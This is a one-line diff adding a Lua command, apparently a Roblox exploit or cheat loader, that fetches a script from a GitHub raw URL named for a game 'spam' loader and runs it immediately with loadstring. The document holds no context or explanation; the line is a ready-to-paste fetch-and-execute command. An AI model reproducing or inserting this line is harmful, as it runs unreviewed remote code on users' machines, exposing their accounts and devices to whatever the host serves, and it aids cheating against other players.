@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/forsaken-spam4-48qo6ggiocfcqz.lua"))()
